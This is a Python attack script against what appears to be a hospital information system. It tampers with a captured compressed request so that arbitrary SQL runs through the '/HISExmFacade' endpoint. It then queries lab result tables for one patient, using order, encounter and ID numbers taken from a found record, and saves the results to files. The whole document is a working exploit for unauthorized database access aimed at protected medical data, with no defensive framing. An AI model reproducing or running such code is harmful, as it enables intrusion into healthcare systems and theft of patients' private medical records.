from his_client_final import HISClient
import requests
import zlib
import re

class LabSearcher2(HISClient):
    def execute_sql(self, sql):
        try:
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()
            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            target_len = len(original_sql_bytes)
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            padded_sql = sql.ljust(target_len)
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

searcher = LabSearcher2()

# From found_record.txt:
# ORDSEQ = A75176986OR0041
# HHISTNUM = 003617083J
# ENCNTNO = 75176986
# HIDNO = C221748019
# ORDAPNO = 73474467

ordseq = 'A75176986OR0041'
encntno = '75176986'
ordapno = '73474467'

# 1. Try PAT_RESULTH with all possible key columns
print("1. Trying all possible key columns in PAT_RESULTH...")
for col in ['PRH_ORDER_NO', 'PRH_TRX_NUM', 'PRH_PAT_ID', 'PRH_PAT_ALTID']:
    for val in [ordseq, encntno, ordapno]:
        sql = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE {col} = '{val}'"
        res = searcher.execute_sql(sql)
        if res and "<NewDataSet>" in res and "<DRMODIFY>" in res:
            print(f"[+] FOUND! {col} = {val}")
            with open(f"lab_found_{col}_{val}.txt", "w", encoding="utf-8") as f:
                f.write(res)
            print(res[:600])
        else:
            print(f"[-] {col} = {val}: no match")

# 2. Try PAT_RESULTD with all possible key columns
print("\n2. Trying all possible key columns in PAT_RESULTD...")
for col in ['PRD_TRX_NUM', 'PRD_ORDER_NO']:
    for val in [ordseq, encntno, ordapno]:
        sql = f"SELECT * FROM OPDUSR.PAT_RESULTD WHERE {col} = '{val}'"
        res = searcher.execute_sql(sql)
        if res and "<NewDataSet>" in res and "<DRMODIFY>" in res:
            print(f"[+] FOUND! {col} = {val}")
            with open(f"lab_detail_found_{col}_{val}.txt", "w", encoding="utf-8") as f:
                f.write(res)
            print(res[:600])
        else:
            print(f"[-] {col} = {val}: no match")

# 3. Sample PAT_RESULTH to see what PRH_ORDER_NO looks like
print("\n3. Sampling PAT_RESULTH to see PRH_ORDER_NO format...")
sql_sample = "SELECT PRH_TRX_NUM, PRH_ORDER_NO, PRH_PAT_ID, PRH_PAT_ALTID FROM OPDUSR.PAT_RESULTH WHERE ROWNUM <= 3"
res_sample = searcher.execute_sql(sql_sample)
if res_sample and "<NewDataSet>" in res_sample:
    print(res_sample[:800])
else:
    print("[-] No sample data.")
